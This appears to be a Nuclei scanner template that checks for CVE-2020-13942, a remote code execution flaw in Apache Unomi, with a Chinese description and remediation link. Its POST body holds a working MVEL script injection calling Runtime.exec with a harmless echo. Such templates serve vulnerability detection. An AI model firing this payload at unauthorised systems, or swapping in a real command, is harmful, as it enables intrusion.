id: CVE-2020-13942
info:
  name: Apache Unomi <1.5.2 - Remote Code Execution
  author:
  - l0ne1y
  description: |-
    Apache Unomi 脚本注入漏洞
    Apache Unomi 1.5.2之前版本存在注入漏洞，该漏洞源于可以将恶意的OGNL或MVEL脚本注入/context.json公共端点。
  severity: critical
  remediation: |-
    **官方修复方案**
    目前厂商已发布升级补丁以修复漏洞，补丁获取链接：
    http://unomi.apache.org./security/cve-2020-13942.txt
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - '{{randstr}}'
  - type: word
    condition: and
    part: header
    words:
    - application/json
    - context-profile-id
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/context.json'
  method: POST
  body: |
    {
      "filters": [
        {
          "id": "ASasdad",
          "filters": [
            {
              "condition": {
                "parameterValues": {
                  "nuclei": "script::Runtime.getRuntime().exec('echo {{randstr}}')"
                },
                "type": "profilePropertyCondition"
              }
            }
          ]
        }
      ],
      "sessionId": "ASasdad"
    }
  headers:
    Content-Type: application/json
